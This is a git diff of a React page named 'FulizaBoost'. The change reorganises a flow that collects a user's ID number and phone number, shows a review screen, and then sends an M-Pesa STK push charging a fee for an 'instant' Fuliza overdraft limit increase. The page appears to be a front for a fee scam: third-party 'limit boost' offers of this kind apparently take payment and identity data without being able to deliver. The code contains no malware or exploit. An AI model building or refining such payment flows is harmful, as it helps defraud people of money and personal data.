@@ -39,8 +39,8 @@ export default function FulizaBoostPage() {
   );
 
   const [isModalOpen, setModalOpen] = React.useState(false);
-  const [isReviewOpen, setReviewOpen] = React.useState(false);     // Review screen
-  const [isSuccessOpen, setSuccessOpen] = React.useState(false);   // Success screen
+  const [isReviewOpen, setReviewOpen] = React.useState(false);
+  const [isSuccessOpen, setSuccessOpen] = React.useState(false);
   const [idNumber, setIdNumber] = React.useState('');
   const [phoneNumber, setPhoneNumber] = React.useState('');
   const [isLoading, setLoading] = React.useState(false);
@@ -74,11 +74,19 @@ export default function FulizaBoostPage() {
     if (!isLoading) setModalOpen(false);
   }
 
-  async function handleSubmit() {
-    if (!selectedOption || !isValid || isLoading) return;
+  // "Continue" → only go to review screen (no fetch yet)
+  function handleContinue() {
+    if (!isValid) return;
+    setModalOpen(false);
+    setReviewOpen(true);
+  }
 
-    setErrorMsg(null);
+  // "Pay & Boost" on review → now send the STK push
+  async function handleConfirmPayment() {
+    if (!selectedOption) return;
+
     setLoading(true);
+    setErrorMsg(null);
 
     const cleanedPhone = phoneNumber.replace(/\D/g, '');
     const payload = {
@@ -108,30 +116,23 @@ export default function FulizaBoostPage() {
         throw new Error(data?.error || `Failed with status ${res.status}`);
       }
 
-      // Success → close modal → show REVIEW screen
-      setModalOpen(false);
-      setReviewOpen(true);
+      // Success → go to success screen
+      setReviewOpen(false);
+      setSuccessOpen(true);
 
     } catch (err: any) {
       console.error('Fetch error:', err);
-      setErrorMsg(err.message || 'An error occurred');
+      setErrorMsg(err.message || 'Payment initiation failed');
+      setReviewOpen(false); // optional: close review on error
     } finally {
       setLoading(false);
     }
   }
 
-  // From review → go to success
-  function handleConfirmPayment() {
-    setReviewOpen(false);
-    setSuccessOpen(true);
-  }
-
-  // Cancel from review
   function handleCancelReview() {
     setReviewOpen(false);
   }
 
-  // Return to main page from success
   function handleReturnToDashboard() {
     setSuccessOpen(false);
     setReviewOpen(false);
@@ -149,7 +150,7 @@ export default function FulizaBoostPage() {
           <main className="mx-auto flex w-full max-w-sm flex-col gap-3 px-4 pb-10 pt-4">
             {/* Header */}
             <header className="flex flex-col items-center gap-1">
-              <div className="text-xl font-semibold tracking-tight text-[#0cc45f]">Fuliza Limit Boost</div>
+              <div className="text-xl font-semibold tracking-tight text-[#0cc45f]">FulizaBoost</div>
               <div className="text-center text-[11px] text-slate-500">
                 Instant Limit Increase - No Paperwork - Same Day Access
               </div>
@@ -374,7 +375,7 @@ export default function FulizaBoostPage() {
 
                     <button
                       type="button"
-                      onClick={handleSubmit}
+                      onClick={handleContinue}
                       disabled={!isValid || isLoading}
                       className={`mt-6 w-full rounded-xl px-4 py-3 text-sm font-semibold text-white shadow-sm transition-colors focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40 ${
                         !isValid || isLoading ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#0cc45f] hover:bg-[#0bb04f]'
@@ -405,12 +406,12 @@ export default function FulizaBoostPage() {
       {isReviewOpen && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-gradient-to-b from-[#e6fff2] to-[#f0fff5] px-4">
           <div className="w-full max-w-sm rounded-2xl bg-white p-8 shadow-2xl ring-1 ring-slate-200">
-            <h1 className="text-3xl font-bold text-[#0cc45f] mb-1">Fuliza Limit Boost</h1>
+            <h1 className="text-3xl font-bold text-[#0cc45f] mb-1">FulizaBoost</h1>
             <div className="h-1 bg-[#0cc45f] w-16 mx-auto mb-6 rounded-full"></div>
 
             <h2 className="text-2xl font-bold text-gray-800 mb-2">Review Request</h2>
             <p className="text-gray-600 mb-8">
-              Please confirm your details before initiating STK push for activation.
+              Please confirm your selection before we initiate the STK push.
             </p>
 
             <div className="space-y-6 mb-10">
@@ -435,9 +436,12 @@ export default function FulizaBoostPage() {
 
             <button
               onClick={handleConfirmPayment}
-              className="w-full rounded-xl bg-[#0cc45f] px-6 py-4 text-lg font-semibold text-white shadow-lg hover:bg-[#0bb04f] transition-colors focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40 mb-4"
+              disabled={isLoading}
+              className={`w-full rounded-xl px-6 py-4 text-lg font-semibold text-white shadow-lg transition-colors focus:outline-none focus:ring-2 focus:ring-[#0cc45f]/40 mb-4 ${
+                isLoading ? 'bg-gray-400 cursor-not-allowed' : 'bg-[#0cc45f] hover:bg-[#0bb04f]'
+              }`}
             >
-              Pay Ksh {fee.toLocaleString('en-KE')} & Boost
+              {isLoading ? 'Processing...' : `Pay Ksh ${fee.toLocaleString('en-KE')} & Boost`}
             </button>
 
             <button
